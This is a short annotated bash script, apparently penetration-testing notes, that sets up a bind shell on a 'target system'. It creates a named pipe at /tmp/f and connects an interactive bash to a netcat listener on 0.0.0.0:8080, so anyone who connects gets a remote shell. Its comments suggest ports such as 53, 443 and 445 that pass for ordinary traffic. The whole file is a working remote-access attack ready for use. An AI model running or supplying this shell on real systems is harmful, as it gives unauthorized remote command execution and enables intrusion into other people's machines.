#! /bin/bash
# Simple bind shell syntax to be used on target system to react to connection requests
# rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
# Works out of the box

# Remove any existing pipe called f under /tmp to avoid conflicts
rm -f /tmp/f
# Make a new pipe  (First In First Out) called f
mkfifo /tmp/f
# Read the input of the pipe and push it to shell instance (sh -i or can use bash -i 2>&1)
# This is where it differs from a reverse shell, create a netcat listening instance to
# listen for any ip under port 8080 (Can use any port but should use 
# 8080 (http alt), 53 (DNS), 80 (http), 443 (https), 139 (SMB), 445 (SMB)
# > /tmp/f cycle output back to pipe so the remote computer sees the output.
cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
